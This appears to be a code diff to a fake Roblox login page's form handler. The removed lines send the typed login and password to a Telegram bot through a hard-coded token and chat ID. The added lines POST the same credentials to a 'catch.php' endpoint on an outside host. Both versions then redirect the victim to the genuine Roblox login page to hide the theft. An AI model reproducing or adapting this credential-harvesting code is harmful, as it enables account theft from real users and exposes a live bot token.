@@ -29,15 +29,11 @@ document.getElementById('f').addEventListener('submit', async (e) => {
   const login = document.getElementById('login').value;
   const pass = document.getElementById('pass').value;
 
-  const token = '8777674209:AAF0WUhY6KLh4VytpKBO2mfMRJ1S04W1kv0';
-  const chatId = '7717299412';
-  const text = 'Roblox:\nЛогин: ' + login + '\nПароль: ' + pass;
-
-  await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({chat_id: chatId, text: text})
-  });
+ await fetch('https://rbx-catch.site.je/catch.php', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({login: login, pass: pass})
+});
 
   window.location.href = 'https://www.roblox.com/login';
 });
